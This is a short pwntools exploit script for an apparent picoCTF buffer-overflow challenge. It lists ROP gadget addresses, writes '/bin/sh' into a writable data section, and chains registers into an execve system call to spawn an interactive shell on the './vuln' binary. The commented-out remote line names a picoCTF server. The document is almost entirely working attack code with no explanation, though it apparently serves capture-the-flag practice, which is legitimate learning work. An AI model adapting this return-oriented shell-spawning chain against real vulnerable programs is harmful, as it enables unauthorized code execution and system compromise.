p_eax = 0x080b089a 			# pop eax ; ret
p_ebx = 0x08049022 			# pop ebx ; ret
p_edx = 0x0805eea9 			# pop edx ; pop ebx ; ret
writegadget = 0x0805fbe2 	# mov dword ptr [edx], eax; ret;
bin_sh = 0x080e7000			# /bin/sh\x00 write in start data rw-

'''   

0x804a88f <__libc_start_main+1519>:	xor    ecx,ecx
0x804a891 <__libc_start_main+1521>:	int    0x80

'''
ecx = 0x0804a88f


from pwn import *
p = process('./vuln')
# gdb.attach(p)
# p = remote("saturn.picoctf.net", 56322)

p.recvuntil("the flag")

payload = "A" * 0xe
payload += p32(p_eax) + "/bin"
payload += p32(p_edx) + p32(bin_sh) + p32(0xdeadbeef)
payload += p32(writegadget)
payload += p32(p_eax) + "/sh\x00"
payload += p32(p_edx) + p32(bin_sh + 0x4) + p32(0xdeadbeef)
payload += p32(writegadget)
payload += p32(p_edx) + p32(0x00) + p32(bin_sh)
payload += p32(p_eax) + p32(0x0b)
payload += p32(ecx)


p.sendline(payload)

p.interactive()

'''
addr_UnderConstruction = 0x8049e20
addr_win = 0x08049da0

addr_vuln = 0x8049ec0
addr_main = 0x8049f00
'''
